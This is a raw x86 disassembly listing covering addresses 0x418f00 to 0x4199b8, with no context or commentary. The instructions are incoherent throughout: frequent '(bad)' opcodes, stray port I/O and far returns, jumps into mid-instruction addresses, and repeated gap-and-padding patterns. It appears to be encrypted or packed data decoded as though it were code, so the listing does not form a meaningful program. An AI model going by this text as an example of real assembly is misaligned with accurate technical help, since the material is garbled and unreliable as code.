  418f00:	sti    
  418f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f02:	xchg   esi,eax
  418f03:	jno    0x418ee8
  418f05:	dec    ebx
  418f06:	inc    ebx
  418f07:	ret    0x5de8
  418f0a:	and    ebx,DWORD PTR gs:[esi]
  418f0d:	popa   
  418f0e:	pop    ebp
  418f0f:	repz push es
  418f11:	faddp  st(6),st
  418f13:	fs add bl,dh
  418f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f17:	test   al,0x25
  418f19:	sbb    DWORD PTR [edi+0x4d],edx
  418f1c:	out    0x8,al
  418f1e:	xchg   ebp,eax
  418f1f:	jne    0x418f95
  418f21:	xchg   ebx,eax
  418f22:	not    BYTE PTR [ebp+0x15]
  418f25:	or     BYTE PTR [edi],0xf7
  418f28:	pop    eax
  418f29:	stc    
  418f2a:	jo     0x418f16
  418f2c:	sub    ebx,edx
  418f2e:	or     ebx,ebx
  418f30:	push   cs
  418f31:	cmp    ecx,DWORD PTR [edx+0x6e]
  418f34:	es repz mov bl,0x27
  418f38:	push   ss
  418f39:	loop   0x418f98
  418f3b:	adc    edi,0xfffffff3
  418f3e:	ds and eax,0xae524fe4
  418f44:	shr    BYTE PTR [edi-0x62],1
  418f47:	mov    al,0xc5
  418f49:	imul   edi,eax,0x39
  418f4c:	push   edi
  418f4d:	cwde   
  418f4e:	xchg   edx,eax
  418f4f:	ret    
  418f50:	loopne 0x418f86
  418f52:	pusha  
  418f53:	out    0xf1,al
  418f55:	scas   al,BYTE PTR es:[edi]
  418f56:	jo     0x418fc8
  418f58:	pop    ebx
  418f59:	cmp    eax,0xfaa7effd
  418f5e:	ss retf 0x4813
  418f62:	fcomip st,st(1)
  418f64:	cld    
  418f65:	xlat   BYTE PTR ds:[ebx]
  418f66:	das    
  418f67:	in     al,0xd1
  418f69:	retf   
  418f6a:	pop    esp
  418f6b:	push   ecx
  418f6c:	dec    esi
  418f6d:	jp     0x418fa1
  418f6f:	sub    bh,dh
  418f71:	cld    
  418f72:	adc    ebx,DWORD PTR [ecx+0x5c]
  418f75:	pop    ecx
  418f76:	outs   dx,DWORD PTR ds:[esi]
  418f77:	jecxz  0x418f5f
  418f79:	sbb    BYTE PTR [edi+0x67985560],bh
  418f7f:	and    eax,edx
  418f81:	or     edi,esi
  418f83:	jle    0x418f84
  418f85:	xor    BYTE PTR [esi+0x71],0x83
  418f89:	ds stos DWORD PTR es:[edi],eax
  418f8b:	inc    ecx
  418f8c:	das    
  418f8d:	shr    DWORD PTR ds:0x7dc76c5c,0xae
  418f94:	pop    es
  418f95:	mov    edi,0x90557b35
  418f9a:	daa    
  418f9b:	jmp    0x418f79
  418f9d:	imul   BYTE PTR [ecx]
  418f9f:	xchg   esp,eax
  418fa0:	ret    
  418fa1:	ret    
  418fa2:	test   DWORD PTR [edi],ebp
  418fa4:	or     DWORD PTR [ebx-0x66],edi
  418fa7:	jmp    0x418f94
  418fa9:	nop
  418faa:	sbb    al,0xac
  418fac:	push   ebx
  418fad:	xchg   edi,eax
  418fae:	mov    ch,0xc4
  418fb0:	mov    edi,0xea173388
  418fb5:	retf   0x3f14
  418fb8:	xchg   ecx,eax
  418fb9:	pop    edi
  418fba:	popa   
  418fbb:	cwde   
  418fbc:	aaa    
  418fbd:	sbb    dh,ch
  418fbf:	xchg   ebx,eax
  418fc0:	iret   
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	rcl    BYTE PTR [ecx+0x7e],cl
  419042:	test   DWORD PTR [edi+0x10fa8],eax
  419048:	cmc    
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [esi-0x5],cl
  41904e:	sbb    edi,DWORD PTR ds:[esi-0x601b011b]
  419055:	xor    DWORD PTR ds:0xf16fb2fc,eax
  41905b:	mov    BYTE PTR [ebx+0x4d],bh
  41905e:	xchg   edi,eax
  41905f:	xchg   edx,eax
  419060:	div    DWORD PTR [edi-0x28]
  419063:	aad    0xd0
  419065:	adc    eax,0x3473e9ab
  41906a:	loopne 0x419087
  41906c:	dec    BYTE PTR [ebx-0x663c6432]
  419072:	pop    ds
  419073:	push   ss
  419074:	fwait
  419075:	push   ebx
  419076:	cmp    eax,0x8dafd796
  41907b:	rol    BYTE PTR [eax-0x2de836b0],cl
  419081:	call   DWORD PTR [eax]
  419083:	sub    ecx,DWORD PTR [eax]
  419085:	call   0xeff598f0
  41908a:	xchg   ecx,eax
  41908b:	lods   al,BYTE PTR ds:[esi]
  41908c:	(bad)  
  41908d:	stc    
  41908e:	rol    DWORD PTR [eax+0x6da595c3],1
  419094:	loop   0x4190ae
  419096:	retf   
  419097:	push   edi
  419098:	sti    
  419099:	test   bh,0x90
  41909c:	or     ah,BYTE PTR [edx+0x70]
  41909f:	cmp    dl,dh
  4190a1:	pop    edi
  4190a2:	mov    ds:0x4d68bfdc,eax
  4190a7:	repz jp 0x419106
  4190aa:	pop    ebp
  4190ab:	cmp    ah,cl
  4190ad:	jbe    0x419114
  4190af:	aam    0x6c
  4190b1:	cmp    ebp,DWORD PTR [edx]
  4190b3:	adc    DWORD PTR [esi],eax
  4190b5:	std    
  4190b6:	xchg   ebx,eax
  4190b7:	mov    al,0x0
  4190b9:	add    DWORD PTR [ebx-0x30],esi
  4190bc:	push   eax
  4190bd:	or     eax,0x624ce0a4
  4190c2:	call   0x31e296bf
  4190c7:	push   esi
  4190c8:	int3   
  4190c9:	stos   BYTE PTR es:[edi],al
  4190ca:	sbb    DWORD PTR [edx+0x1d],0x34
  4190ce:	es adc al,0x8f
  4190d1:	and    eax,0x85b6988b
  4190d6:	int    0xdb
  4190d8:	sbb    al,ah
  4190da:	out    0x10,al
  4190dc:	mov    dl,0xf9
  4190de:	mov    ah,0xf8
  4190e0:	sar    BYTE PTR [esi],cl
  4190e2:	test   DWORD PTR [edx-0x6f],edx
  4190e5:	jl     0x419121
  4190e7:	retf   
  4190e8:	sar    dh,1
  4190ea:	retf   0xd1f2
  4190ed:	or     al,0x2a
  4190ef:	mov    ebp,0xabcbd756
  4190f4:	mov    DWORD PTR [ebx-0x4061c8e9],esp
  4190fa:	push   0x632f2082
  4190ff:	daa    
  419100:	mov    al,0x45
  419102:	repz js 0x4190c9
  419105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419106:	shr    DWORD PTR [edx-0x55],0x26
  41910a:	cmc    
  41910b:	fisub  DWORD PTR [esi+0x617c5729]
  419111:	pushf  
  419112:	push   ebx
  419113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419115:	or     DWORD PTR [ebx-0x7a4dc481],eax
  41911b:	inc    esp
  41911c:	xchg   edi,eax
  41911d:	pop    esp
  41911e:	push   edi
  41911f:	ja     0x41917d
  419121:	jne    0x4190ab
  419123:	xchg   ebx,eax
  419124:	add    al,0xfd
  419126:	pusha  
  419127:	add    esp,DWORD PTR [eax+ebx*4]
  41912a:	(bad)  
  41912b:	in     al,0x6e
  41912d:	iret   
  41912e:	push   0xfb488c3
  419133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419134:	pop    esp
  419135:	pop    ebx
  419136:	mov    eax,0x96011a2b
  41913b:	mov    ebp,0x778de21e
  419140:	fiadd  WORD PTR [eax]
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	mov    edi,0x9d837acc
  4191c5:	adc    BYTE PTR [ecx],al
  4191c7:	add    ch,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    bh,dh
  4191cd:	cs cli 
  4191cf:	lock enter 0xdd7d,0x87
  4191d4:	push   ebx
  4191d5:	sbb    DWORD PTR [eax],ebp
  4191d7:	mov    esi,0x819ec24
  4191dc:	enter  0xf57,0xba
  4191e0:	push   esi
  4191e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191e2:	faddp  st(6),st
  4191e4:	lock retf 
  4191e6:	push   edi
  4191e7:	xlat   BYTE PTR ds:[ebx]
  4191e8:	mov    cl,0xbb
  4191ea:	shr    ebp,0xa8
  4191ed:	mov    edx,0x3417e0d7
  4191f2:	loope  0x419238
  4191f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191f5:	push   ds
  4191f6:	popa   
  4191f7:	inc    eax
  4191f8:	std    
  4191f9:	xchg   edx,eax
  4191fa:	ret    
  4191fb:	cmc    
  4191fc:	lods   al,BYTE PTR ds:[esi]
  4191fd:	jecxz  0x419261
  4191ff:	cs pop ecx
  419201:	sbb    DWORD PTR [eax],0x2078fb0d
  419207:	cmc    
  419208:	test   eax,0x272a1caf
  41920d:	imul   edx,esi,0x75
  419210:	inc    ebp
  419211:	adc    al,0xf6
  419213:	out    0x5,eax
  419215:	retf   0x10a7
  419218:	add    DWORD PTR [edi-0x71],ebx
  41921b:	sub    al,0xbf
  41921d:	dec    esp
  41921e:	mov    esp,esi
  419220:	push   esi
  419221:	psrld  mm6,QWORD PTR [ebx-0x4b]
  419225:	push   ebx
  419226:	aas    
  419227:	xchg   BYTE PTR [esi],al
  419229:	xor    ebx,DWORD PTR [esi-0x1964d2b9]
  41922f:	jge    0x41920b
  419231:	lock fwait
  419233:	out    0xda,eax
  419235:	mov    al,ds:0x2c7a2346
  41923a:	mov    WORD PTR [ebp-0x45],gs
  41923d:	bound  ecx,QWORD PTR [ebp+0x2778c2e6]
  419243:	test   edx,0x98b199fe
  419249:	xchg   BYTE PTR [edi-0x43],ch
  41924c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41924d:	arpl   WORD PTR [edx],si
  41924f:	sahf   
  419250:	data16 or ah,al
  419253:	adc    eax,0x5cd348d
  419258:	loop   0x4192b6
  41925a:	daa    
  41925b:	cmp    DWORD PTR [ebx+0x27d557d1],esp
  419261:	adc    DWORD PTR [ebp+0x636d860c],ebp
  419267:	out    dx,eax
  419268:	stos   DWORD PTR es:[edi],eax
  419269:	inc    edi
  41926a:	xchg   ebp,eax
  41926b:	mov    WORD PTR [esi-0x7e],ss
  41926e:	imul   ebx,edx,0xcbe9cc4f
  419274:	outs   dx,BYTE PTR ds:[esi]
  419275:	ret    
  419276:	daa    
  419277:	inc    esi
  419278:	dec    ecx
  419279:	call   0xeb0f294a
  41927e:	(bad)  
  41927f:	pop    ss
  419280:	mov    ah,dh
  419282:	mov    al,0xd4
  419284:	(bad)  [ebx-0x37f8ac04]
  41928a:	call   0xccb9:0x4a75ac27
  419291:	push   ss
  419292:	fisttp WORD PTR [edi-0x6b22633]
  419298:	jg     0x41927d
  41929a:	or     al,0x52
  41929c:	fisttp WORD PTR [eax+0x7e]
  41929f:	ds push cs
  4192a1:	push   esi
  4192a2:	inc    eax
  4192a3:	mov    ?,eax
  4192a5:	bound  ebx,QWORD PTR [eax]
  4192a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192a8:	outs   dx,BYTE PTR ds:[esi]
  4192a9:	sub    ebp,edi
  4192ab:	xor    BYTE PTR [ebx+0x100b53ed],ch
  4192b1:	nop
  4192b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192b3:	or     DWORD PTR [edi+0xbf7c133],eax
  4192b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ba:	pop    ss
  4192bb:	adc    DWORD PTR [eax],ebp
  4192bd:	adc    ebp,DWORD PTR ds:0x5123
	...
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	adc    ebx,0x30
  419343:	xchg   edi,eax
  419344:	xchg   edx,eax
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    ch,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    ah,ch
  41934d:	adc    ah,ch
  41934f:	inc    BYTE PTR [ecx+0x35e1049]
  419355:	test   BYTE PTR [eax+0x1190c59c],bh
  41935b:	mov    esp,DWORD PTR [ecx-0x5b]
  41935e:	ret    
  41935f:	gs addr16 adc eax,0x7e2136e7
  419366:	adc    al,0x2e
  419368:	push   ds
  419369:	pop    edx
  41936a:	inc    ecx
  41936b:	mov    ebp,0x739cc47a
  419370:	ins    DWORD PTR es:[edi],dx
  419371:	dec    ecx
  419372:	repnz mov ah,al
  419375:	repz (bad) 
  419377:	or     ax,0xe617
  41937b:	(bad)  
  41937c:	into   
  41937d:	ja     0x4193d7
  41937f:	imul   esp,DWORD PTR [ecx],0xcec6d85f
  419385:	xchg   esp,eax
  419386:	sub    eax,0x7a27648e
  41938b:	mov    DWORD PTR [ebp+0x4254a1ba],edx
  419391:	outs   dx,DWORD PTR ds:[esi]
  419392:	(bad)  
  419393:	ds out 0xda,eax
  419396:	fcmovbe st,st(7)
  419398:	jo     0x419392
  41939a:	ret    0xd4e7
  41939d:	xchg   esi,eax
  41939e:	lods   al,BYTE PTR ds:[esi]
  41939f:	dec    edx
  4193a0:	stos   BYTE PTR es:[edi],al
  4193a1:	adc    BYTE PTR [edx+eax*4],bl
  4193a4:	out    0xc8,al
  4193a6:	sbb    eax,0xe58f95ce
  4193ab:	add    DWORD PTR [edx-0x7f],esi
  4193ae:	add    DWORD PTR [ebp+0x738d9fc1],esi
  4193b4:	sti    
  4193b5:	jle    0x419407
  4193b7:	out    dx,al
  4193b8:	das    
  4193b9:	inc    eax
  4193ba:	push   ebp
  4193bb:	loope  0x419362
  4193bd:	rol    BYTE PTR [ebx+0x70d9d26e],0xa2
  4193c4:	mov    gs,WORD PTR [eax+0x1]
  4193c7:	ins    BYTE PTR es:[edi],dx
  4193c8:	mov    ah,dh
  4193ca:	sbb    BYTE PTR [esi+0x7ca05c11],0x6d
  4193d1:	and    DWORD PTR [ecx-0x32e2ccf6],ebx
  4193d7:	push   ss
  4193d8:	push   esp
  4193d9:	push   ebp
  4193da:	jae    0x41943b
  4193dc:	jecxz  0x4193a9
  4193de:	mov    al,0x77
  4193e0:	add    eax,0xbfcd56d2
  4193e5:	ins    BYTE PTR es:[edi],dx
  4193e6:	adc    BYTE PTR [ebp-0x6434d875],0x56
  4193ed:	xor    edi,esp
  4193ef:	xchg   esi,eax
  4193f0:	add    DWORD PTR [ecx-0x23],ebp
  4193f3:	sub    DWORD PTR [edi-0x7e33aeb2],ebx
  4193f9:	rcr    BYTE PTR [ebp+edx*8-0x5a5ff4fc],1
  419400:	sub    ebx,DWORD PTR [esi]
  419402:	loop   0x4193d5
  419404:	pushf  
  419405:	leave  
  419406:	ds into 
  419408:	ins    DWORD PTR es:[edi],dx
  419409:	fistp  DWORD PTR [eax+0x18]
  41940c:	scas   eax,DWORD PTR es:[edi]
  41940d:	cs cli 
  41940f:	push   ds
  419410:	pop    es
  419411:	or     BYTE PTR [ebp+0x51],ah
  419414:	xchg   ebp,eax
  419415:	or     ebp,DWORD PTR [edi-0x79ed65fb]
  41941b:	fbstp  TBYTE PTR [edi]
  41941d:	mov    BYTE PTR [edx+0xa5f0e93],al
  419423:	arpl   WORD PTR [esi+0x5e],cx
  419426:	push   edi
  419427:	dec    edx
  419428:	gs sti 
  41942a:	cli    
  41942b:	xor    edx,DWORD PTR [edx+0x0]
  41942e:	test   edx,esi
  419430:	and    al,0xd4
  419432:	mov    edi,0xbdb888f4
  419437:	ins    BYTE PTR es:[edi],dx
  419438:	loop   0x4193ff
  41943a:	fild   QWORD PTR [esi-0x4e]
  41943d:	fwait
  41943e:	sbb    DWORD PTR [ecx-0x56],edx
	...
  4194b1:	add    BYTE PTR [eax],al
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	mov    esp,0x873bb4c6
  4194c5:	adc    al,BYTE PTR [ecx]
  4194c7:	add    ch,dh
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [ebp-0xd047ec0],ch
  4194d1:	push   ebp
  4194d2:	push   ebx
  4194d3:	pusha  
  4194d4:	out    dx,al
  4194d5:	mov    ebx,0xade4d24e
  4194da:	xchg   esp,eax
  4194db:	xor    al,0xc1
  4194dd:	xchg   ebx,eax
  4194de:	pop    eax
  4194df:	xchg   ebx,eax
  4194e0:	and    ah,ah
  4194e2:	jmp    0x419546
  4194e4:	cdq    
  4194e5:	xlat   BYTE PTR ds:[ebx]
  4194e6:	cmp    al,0x3d
  4194e8:	outs   dx,DWORD PTR ds:[esi]
  4194e9:	js     0x4194e4
  4194eb:	stc    
  4194ec:	or     ch,BYTE PTR [ebp-0x3e11a723]
  4194f2:	mov    dl,0x49
  4194f4:	imul   esp,DWORD PTR [ecx+esi*1-0x71],0x8cc08422
  4194fc:	shl    BYTE PTR [ecx],0xca
  4194ff:	sbb    eax,DWORD PTR [ecx+0x61]
  419502:	xor    cl,dl
  419504:	into   
  419505:	or     DWORD PTR [ebp+0x8],edi
  419508:	xor    bh,BYTE PTR [edi]
  41950a:	aaa    
  41950b:	mov    eax,0xc1c10763
  419510:	dec    ecx
  419511:	sahf   
  419512:	adc    al,0x6f
  419514:	inc    esi
  419515:	mov    eax,ds:0x7cb70830
  41951a:	xor    al,0x4f
  41951c:	loopne 0x41956a
  41951e:	add    dh,ch
  419520:	cmp    DWORD PTR [esi+0x1686ea0b],0x3b
  419527:	aad    0xda
  419529:	sub    BYTE PTR [esi+0xfec6009],0x33
  419530:	jp     0x4194bc
  419532:	es mov ch,0x59
  419535:	xlat   BYTE PTR ds:[ebx]
  419536:	lods   eax,DWORD PTR ds:[esi]
  419537:	shl    BYTE PTR [edi-0x11],cl
  41953a:	mov    esi,0x673bd419
  41953f:	add    BYTE PTR [edi+0x27e371f7],bl
  419545:	mov    eax,ds:0x996bebfd
  41954a:	adc    ecx,DWORD PTR [eax+0x11027c1f]
  419550:	jecxz  0x41959e
  419552:	dec    esi
  419553:	sbb    ebp,0xf50cace7
  419559:	pop    ebp
  41955a:	cld    
  41955b:	sbb    cl,dl
  41955d:	fsubr  QWORD PTR [esi-0x1d]
  419560:	xchg   esi,eax
  419561:	(bad)  
  419562:	lods   al,BYTE PTR ds:[esi]
  419563:	fiadd  DWORD PTR [eax]
  419565:	aam    0x87
  419567:	icebp  
  419568:	jo     0x4195d6
  41956a:	lea    ecx,[ebp+0x7b7e0817]
  419570:	or     edx,DWORD PTR [ebp-0x4aa79792]
  419576:	imul   esi,esi,0xba2265b6
  41957c:	lods   eax,DWORD PTR ds:[esi]
  41957d:	mov    eax,ds:0x241571e5
  419582:	add    cl,dh
  419584:	jo     0x419545
  419586:	mov    ?,WORD PTR [ecx-0x80]
  419589:	adc    al,0x2a
  41958b:	test   BYTE PTR [ecx-0x2ecc7790],dl
  419591:	xor    al,0xff
  419593:	jbe    0x4195db
  419595:	sub    ch,BYTE PTR [ebx+0x29f87028]
  41959b:	mov    dh,0x2b
  41959d:	sbb    BYTE PTR [ebx+0x3c],dh
  4195a0:	iret   
  4195a1:	(bad)  
  4195a3:	cmp    DWORD PTR [eax+0x5e],esp
  4195a6:	cmp    al,0x9f
  4195a8:	mov    esp,0xad52256e
  4195ad:	mov    ebp,0x34c365bf
  4195b2:	fcmovnu st,st(6)
  4195b4:	mov    bl,0x3f
  4195b6:	mov    edi,0x91383064
  4195bb:	mov    cl,BYTE PTR [edx]
  4195bd:	cwde   
  4195be:	inc    ebx
  4195bf:	adc    DWORD PTR [eax+0x0],ecx
	...
  419631:	add    BYTE PTR [eax],al
  419633:	add    BYTE PTR [ebx-0x44c35fd8],dl
  419639:	mov    esp,0xad76af9f
  41963e:	or     esp,DWORD PTR [eax+0x69762cb7]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [ebx+0x8b42809],ch
  419651:	fadd   QWORD PTR [eax]
  419653:	mov    ecx,0x5a46d43
  419658:	push   es
  419659:	test   BYTE PTR [ebp+0x73e51e2b],0x61
  419660:	dec    ebx
  419661:	test   al,0x10
  419663:	xor    ecx,DWORD PTR [edi]
  419665:	xor    eax,0xfaece3aa
  41966a:	inc    esi
  41966b:	jae    0x4196eb
  41966d:	shl    BYTE PTR [eax+ebx*1+0x3d],0x0
  419672:	mov    ch,0x87
  419674:	mov    BYTE PTR [ebx+0x1096010c],0xd4
  41967b:	in     eax,0xfb
  41967d:	shr    DWORD PTR [eax-0x184172f2],cl
  419683:	in     al,0x6f
  419685:	retf   0x34e5
  419688:	sbb    ch,cl
  41968a:	fs (bad) 
  41968c:	stc    
  41968d:	call   0x168d91b1
  419692:	ds out 0x9e,eax
  419695:	(bad)  
  419696:	push   0xdd169d55
  41969b:	ret    
  41969c:	jo     0x419662
  41969e:	psrad  mm7,QWORD PTR [ebx]
  4196a1:	(bad)  
  4196a2:	call   0x30b6aa5a
  4196a7:	js     0x419655
  4196a9:	mov    eax,0x429b739f
  4196ae:	imul   edx,ebx,0x2a
  4196b1:	(bad)  
  4196b2:	cdq    
  4196b3:	mov    al,ds:0x9127e344
  4196b8:	popa   
  4196b9:	cs jne 0x419703
  4196bc:	aam    0x39
  4196be:	jp     0x4196d5
  4196c0:	add    eax,0xc67481de
  4196c5:	fwait
  4196c6:	mov    al,0x65
  4196c8:	and    al,0xf1
  4196ca:	test   BYTE PTR [eax-0x11],ah
  4196cd:	jb     0x419656
  4196cf:	mov    ch,0xc1
  4196d1:	xor    edx,DWORD PTR [ecx+edx*8-0x572a1e47]
  4196d8:	out    0xb0,eax
  4196da:	xor    al,0xf0
  4196dc:	aam    0x1e
  4196de:	fwait
  4196df:	jecxz  0x419712
  4196e1:	(bad)  
  4196e2:	out    dx,al
  4196e3:	nop
  4196e4:	mov    esp,0x54a04e0e
  4196e9:	and    DWORD PTR [ecx],edx
  4196eb:	fsubr  DWORD PTR [esi+0x295e921e]
  4196f1:	jne    0x41975b
  4196f3:	addr16 jbe 0x41968a
  4196f6:	nop
  4196f7:	pop    ebx
  4196f8:	jl     0x419696
  4196fa:	cmp    BYTE PTR [eax+0x7a],ah
  4196fd:	je     0x4196d0
  4196ff:	add    eax,0xc472d09a
  419704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419705:	jp     0x41969f
  419707:	cmp    eax,0x53b81aba
  41970c:	mov    dh,0xb9
  41970e:	jecxz  0x419786
  419710:	adc    DWORD PTR [esi],esi
  419712:	bound  eax,QWORD PTR [ecx-0x605e445b]
  419718:	push   ss
  419719:	stc    
  41971a:	push   esp
  41971b:	sar    DWORD PTR [edi],0x5
  41971e:	scas   eax,DWORD PTR es:[edi]
  41971f:	and    eax,0xdef665d
  419724:	dec    edx
  419725:	mov    ds:0x83826543,al
  41972a:	pop    edx
  41972b:	xchg   DWORD PTR [edx-0x4e],edx
  41972e:	fwait
  41972f:	retf   
  419730:	(bad)  
  419731:	jge    0x4196e0
  419733:	mov    dh,0x20
  419735:	pop    esi
  419736:	push   ds
  419737:	jle    0x4196cb
  419739:	daa    
  41973a:	lods   eax,DWORD PTR ds:[esi]
  41973b:	push   ecx
  41973c:	icebp  
  41973d:	pop    esp
  41973e:	dec    ebp
  41973f:	aad    0x1f
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x1727cbe9]
  4197c1:	mov    eax,ds:0x14714873
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	cmc    
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [eax+esi*2],ch
  4197ce:	enter  0x268c,0x6f
  4197d2:	lock jp 0x41984b
  4197d5:	sbb    eax,DWORD PTR [edx+eax*2-0x335e4aa4]
  4197dc:	in     eax,dx
  4197dd:	lods   eax,DWORD PTR ds:[esi]
  4197de:	jl     0x41983b
  4197e0:	sar    BYTE PTR [esp+edx*2],cl
  4197e3:	shl    al,cl
  4197e5:	jmp    0x8a06:0x615b17e8
  4197ec:	outs   dx,DWORD PTR ds:[esi]
  4197ed:	dec    BYTE PTR [ebx+0x68fe07ac]
  4197f3:	sub    al,0x31
  4197f5:	push   es
  4197f6:	jle    0x4197dc
  4197f8:	mov    cl,0x5f
  4197fa:	xchg   ebp,eax
  4197fb:	mov    fs,WORD PTR [ecx-0x1599e823]
  419801:	(bad)  
  419803:	lahf   
  419804:	cs jle 0x4197a2
  419807:	jge    0x419794
  419809:	adc    eax,0x942cf5d5
  41980e:	js     0x4197cc
  419810:	jmp    0x224b0843
  419815:	shl    BYTE PTR [eax],0xf3
  419818:	xchg   eax,ebp
  41981a:	inc    esp
  41981b:	sbb    cl,dh
  41981d:	imul   DWORD PTR [eax]
  41981f:	dec    ebx
  419820:	mov    ch,0x0
  419822:	add    ebx,edx
  419824:	idiv   DWORD PTR [edx]
  419826:	or     ch,BYTE PTR [ecx+ecx*2-0x79]
  41982a:	pop    edx
  41982b:	(bad)  
  41982d:	or     ebx,ebx
  41982f:	and    DWORD PTR [ebx],esi
  419831:	jne    0x4197e4
  419833:	pop    esi
  419834:	(bad)  [eax+0x22469ce]
  41983a:	mov    bh,BYTE PTR [edx-0x768de449]
  419840:	leave  
  419841:	loope  0x41984c
  419843:	jmp    DWORD PTR [ebp+0x29]
  419846:	jns    0x419870
  419848:	fnstsw WORD PTR [ecx]
  41984a:	sub    al,0xcf
  41984c:	or     edi,DWORD PTR [esi]
  41984e:	retf   0x6626
  419851:	xchg   ecx,eax
  419852:	pusha  
  419853:	cli    
  419854:	add    BYTE PTR [esi],al
  419856:	push   edx
  419857:	adc    ch,BYTE PTR ds:[edi]
  41985a:	and    ah,BYTE PTR [edi+0x526d7b7]
  419860:	icebp  
  419861:	pop    ebx
  419862:	inc    esp
  419863:	ret    0xaa18
  419866:	adc    eax,0xa72ac6fb
  41986b:	pop    esi
  41986c:	rcl    BYTE PTR [edi+ebp*4],0x40
  419870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419871:	loopne 0x419880
  419873:	or     al,0xd1
  419875:	jmp    0x21d0c5a
  41987a:	jae    0x41985a
  41987c:	xchg   ebx,eax
  41987d:	and    dh,al
  41987f:	adc    edi,ebx
  419881:	scas   eax,DWORD PTR es:[edi]
  419882:	ja     0x419824
  419884:	iret   
  419885:	and    al,0x68
  419887:	je     0x419825
  419889:	mov    eax,0xb76785ad
  41988e:	push   ebp
  41988f:	fwait
  419890:	jge    0x4198bd
  419892:	and    al,dh
  419894:	cdq    
  419895:	adc    edx,edx
  419897:	(bad)  
  419898:	out    0xcb,eax
  41989a:	jecxz  0x419860
  41989c:	inc    ebx
  41989d:	or     DWORD PTR [edx],0x9
  4198a0:	mov    dl,0x84
  4198a2:	adc    eax,0xaa806e22
  4198a7:	pop    esp
  4198a8:	lea    ebx,[eax]
  4198aa:	pop    ebx
  4198ab:	stc    
  4198ac:	dec    ebx
  4198ad:	mov    DWORD PTR [ebx-0x69],ebp
  4198b0:	retf   0xbcb0
  4198b3:	mov    ebp,0xd73b3dc6
  4198b8:	rcl    DWORD PTR [edx+eiz*4+0x1c],cl
  4198bc:	fldenv [esi]
  4198be:	fstp   QWORD PTR [eax-0x2d]
	...
  419931:	add    BYTE PTR [eax],al
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	pop    ds
  419941:	aad    0x7b
  419943:	out    0x66,al
  419945:	adc    eax,0xf50001
  41994a:	add    BYTE PTR [eax],al
  41994c:	aas    
  41994d:	data16 jnp 0x419912
  419950:	(bad)  
  419951:	(bad)  
  419952:	jmp    0x9b8877f9
  419957:	xchg   ebx,eax
  419958:	mov    esp,0x8f7a16d
  41995d:	repnz loop 0x419986
  419960:	cmp    ebx,DWORD PTR [esi-0x78a19156]
  419966:	jo     0x419901
  419968:	or     BYTE PTR [ebx+0x1c],ch
  41996b:	test   DWORD PTR [esi],0x4506a3ab
  419971:	jp     0x419960
  419973:	aam    0x52
  419975:	jne    0x41991e
  419977:	js     0x419948
  419979:	fisubr DWORD PTR [ebp+0x40]
  41997c:	adc    BYTE PTR [edx],dl
  41997e:	mov    eax,ds:0x92f0a1df
  419983:	pop    ebx
  419984:	or     eax,0x32fd39af
  419989:	outs   dx,BYTE PTR ds:[esi]
  41998a:	sub    ah,BYTE PTR [ebx+0x36]
  41998d:	add    BYTE PTR [ecx],al
  41998f:	jg     0x4199ec
  419991:	pusha  
  419992:	inc    ebp
  419993:	loop   0x4199c1
  419995:	sub    bh,ah
  419997:	mov    DWORD PTR [eax-0x7e24a26c],esi
  41999d:	adc    DWORD PTR [edi+0x39],eax
  4199a0:	add    dl,BYTE PTR [edx+0xd]
  4199a3:	clc    
  4199a4:	cli    
  4199a5:	fisubr DWORD PTR [ebx+0x472cb1e5]
  4199ab:	xor    edi,edi
  4199ad:	(bad)  
  4199af:	mov    DWORD PTR [edx-0x62],ebx
  4199b2:	xlat   BYTE PTR ds:[ebx]
  4199b3:	not    DWORD PTR [ebx+0xd]
  4199b6:	jae    0x4199fa
  4199b8:	pop    esi
